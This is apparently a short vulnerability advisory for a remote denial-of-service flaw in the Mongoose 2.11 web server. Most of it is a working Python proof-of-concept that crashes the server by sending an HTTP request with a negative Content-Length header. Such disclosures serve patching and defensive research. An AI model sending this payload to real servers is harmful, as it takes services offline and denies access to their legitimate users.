source: http://www.securityfocus.com/bid/45602/info

Mongoose is prone to a remote denial-of-service vulnerability because it fails to handle specially crafted input.

Successfully exploiting this issue will allow an attacker to crash the affected application, denying further service to legitimate users.

Mongoose 2.11 is vulnerable; other versions may also be affected. 

import socket
 
host = 'localhost'
port = 8080
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(8)   
s.connect((host, port))
s.send('GET / HTTP/1.1\r\n'
       'Host: ' + host + '\r\n'
       'Content-Length: -2147483648\r\n\r\n')